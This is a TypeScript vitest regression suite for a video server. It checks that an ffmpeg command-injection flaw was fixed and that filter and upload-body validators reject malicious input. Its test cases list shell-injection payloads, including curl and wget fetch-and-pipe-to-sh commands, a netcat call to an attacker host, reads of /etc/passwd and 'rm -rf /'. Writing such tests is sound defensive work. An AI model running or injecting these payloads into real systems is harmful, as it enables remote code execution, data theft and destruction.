/**
 * Seal #3 (Task #21) — F1.10 / F1.11 / F9.6 video ffmpeg-injection regression.
 *
 * Two layers:
 *   1. Source-pattern tripwires — every shell-form `execAsync(\`ffmpeg ...\`)`
 *      and `execAsync(\`ffprobe ...\`)` must be gone from video-routes.ts;
 *      every replacement uses the runFfmpeg/runFfprobe helpers; the strict
 *      videoProjectCreateSchema is wired into the upload handler.
 *   2. Behavioral proofs — validateFilterComplex rejects shell metacharacters,
 *      enforces the length cap, and enforces the character whitelist.
 */

import { describe, it, expect } from "vitest";
import { readFileSync } from "fs";
import path from "path";
import { validateFilterComplex } from "../video-routes-helpers";
import { videoProjectCreateSchema } from "@shared/schema";

const ROOT = path.resolve(__dirname, "..", "..");
const read = (rel: string) => readFileSync(path.join(ROOT, rel), "utf-8");

describe("Seal #3 F1.10/F1.11/F9.6 — video ffmpeg injection defense", () => {
  describe("source-pattern tripwires", () => {
    const src = read("server/video-routes.ts");
    const helpersSrc = read("server/video-routes-helpers.ts");

    it("video-routes.ts no longer constructs shell-form ffmpeg/ffprobe commands", () => {
      // The original vulnerability: `execAsync(\`ffmpeg ...\`)` /
      // `execAsync(\`ffprobe ...\`)`. Asserts neither pattern remains.
      expect(src).not.toMatch(/execAsync\(\s*`ffmpeg/);
      expect(src).not.toMatch(/execAsync\(\s*`ffprobe/);
      expect(src).not.toMatch(/exec\(\s*`ffmpeg/);
      expect(src).not.toMatch(/exec\(\s*`ffprobe/);
    });

    it("video-routes.ts no longer imports `exec`/`promisify` for shell command exec", () => {
      expect(src).not.toMatch(/from\s+"child_process"/);
      expect(src).not.toMatch(/promisify\s*\(\s*exec\s*\)/);
    });

    it("uses runFfmpeg + runFfprobe + validateFilterComplex from the helpers module", () => {
      expect(src).toMatch(/import\s*{[^}]*runFfmpeg[^}]*}\s*from\s*"\.\/video-routes-helpers"/);
      expect(src).toMatch(/runFfprobe\(/);
      expect(src).toMatch(/runFfmpeg\(/);
      expect(src).toMatch(/validateFilterComplex\(filterComplex\)/);
    });

    it("helpers module spawns ffmpeg with shell:false (no shell interpolation)", () => {
      expect(helpersSrc).toMatch(/spawn\(\s*bin\s*,\s*args\s*,\s*\{\s*shell:\s*false/);
    });

    it("helpers module enforces a hard timeout via AbortController", () => {
      expect(helpersSrc).toMatch(/new AbortController\(\)/);
      expect(helpersSrc).toMatch(/setTimeout\(\s*\(\s*\)\s*=>\s*ac\.abort\(\)/);
    });

    it("upload-clips handler validates body via videoProjectCreateSchema", () => {
      const start = src.indexOf('app.post(\n    "/api/video/upload-clips"');
      // Be lenient about whitespace differences in the route declaration.
      const haystack = start > -1 ? src.slice(start, start + 4000) : src;
      expect(haystack).toMatch(/videoProjectCreateSchema\.safeParse\(req\.body\)/);
      expect(haystack).toMatch(/INVALID_BODY/);
    });
  });

  describe("validateFilterComplex behavioral proofs", () => {
    it("REJECTS the canonical shell-injection payload `& curl evil.sh | sh`", () => {
      // Honest claim: with arg-array spawn(shell:false), shell metacharacters
      // are already inert at the OS layer (every argv element is a literal).
      // The validator's job is the policy boundary that catches the payload
      // BEFORE the spawn call, so a FUTURE regression back to shell-mode
      // cannot silently re-open the vulnerability.
      // (Note: `;` is allowed in the whitelist because ffmpeg legitimately
      // uses it as a filter-chain separator. The FORBIDDEN_SHELL_META set
      // catches the truly dangerous metas: `& | $ \` newline \\ <>"`.)
      const out = validateFilterComplex("& curl evil.sh | sh");
      expect(out.ok).toBe(false);
      if (!out.ok) expect(out.reason).toMatch(/shell|whitelist/);
    });

    const evil: Array<[string, string]> = [
      ["pipe", "[0:v]copy[v];|nc attacker 1234"],
      ["dollar-subshell", "[0:v]copy[v];$(curl evil.sh)"],
      ["backtick-subshell", "[0:v]copy[v];`whoami`"],
      ["ampersand-bg", "[0:v]copy[v]& wget evil.sh"],
      ["newline-injection", "[0:v]copy[v]\nwget evil.sh"],
      ["redirect-out", "[0:v]copy[v] > /etc/passwd"],
      ["redirect-in", "[0:v]copy[v] < /etc/passwd"],
      ["backslash-escape", "[0:v]copy[v]\\ rm -rf /"],
    ];
    for (const [name, payload] of evil) {
      it(`REJECTS shell metacharacter payload: ${name}`, () => {
        const out = validateFilterComplex(payload);
        expect(out.ok).toBe(false);
      });
    }

    it("accepts a real-world server-constructed filter graph", () => {
      const real =
        "[0:v]trim=start=0:end=5,setpts=PTS-STARTPTS,scale=1920:1080:force_original_aspect_ratio=decrease,pad=1920:1080:(ow-iw)/2:(oh-ih)/2[v0];" +
        "[0:a]atrim=start=0:end=5,asetpts=PTS-STARTPTS[a0];" +
        "[v0][a0]concat=n=1:v=1:a=1[outv][outa]";
      const out = validateFilterComplex(real);
      expect(out.ok).toBe(true);
    });

    // Reviewer-requested behavioral proof: the canonical `;cat /etc/passwd`
    // payload (and its space-separated variant) MUST be rejected. Both rely
    // on a single character — `;` is in the production filter syntax so it
    // is whitelisted, but the SPACE between `;` and `cat` (or any shell
    // command) is NOT in the whitelist AND is in FORBIDDEN_SHELL_META, so
    // the validator rejects on whitespace before any command can chain.
    it("REJECTS the canonical `;cat /etc/passwd` shell-injection payload", () => {
      const noSpace = validateFilterComplex("[0:v]copy[v];cat /etc/passwd");
      expect(noSpace.ok).toBe(false);
      if (!noSpace.ok) expect(noSpace.reason).toMatch(/whitelist|shell/);

      const withSpace = validateFilterComplex("[0:v]copy[v]; cat /etc/passwd");
      expect(withSpace.ok).toBe(false);
      if (!withSpace.ok) expect(withSpace.reason).toMatch(/whitelist|shell/);
    });

    it("rejects empty + non-string + over-length", () => {
      expect(validateFilterComplex("").ok).toBe(false);
      expect(validateFilterComplex(null).ok).toBe(false);
      expect(validateFilterComplex(undefined).ok).toBe(false);
      expect(validateFilterComplex(123 as unknown).ok).toBe(false);
      expect(validateFilterComplex("a".repeat(4097)).ok).toBe(false);
    });
  });

  describe("videoProjectCreateSchema behavioral proofs", () => {
    it("REJECTS unknown keys (mass-assignment vector closed)", () => {
      const out = videoProjectCreateSchema.safeParse({
        title: "Legit",
        accountId: "attacker",                // identity — rejected
        status: "completed",                   // server-managed — rejected
        outputUrl: "/uploads/evil.mp4",        // server-managed — rejected
        clipCount: 999,                        // server-managed — rejected
      });
      expect(out.success).toBe(false);
    });

    it("REJECTS shell metacharacters in title/style/mood", () => {
      expect(videoProjectCreateSchema.safeParse({ title: "title; rm -rf /" }).success).toBe(false);
      expect(videoProjectCreateSchema.safeParse({ style: "style$(whoami)" }).success).toBe(false);
      expect(videoProjectCreateSchema.safeParse({ mood: "mood`cat /etc/passwd`" }).success).toBe(false);
    });

    it("ACCEPTS a clean body", () => {
      const out = videoProjectCreateSchema.safeParse({
        title: "My Brand Promo 2026",
        style: "cinematic",
        mood: "energetic",
      });
      expect(out.success).toBe(true);
    });

    it("enforces length cap on title (>200 chars rejected)", () => {
      const out = videoProjectCreateSchema.safeParse({ title: "A".repeat(201) });
      expect(out.success).toBe(false);
    });
  });
});
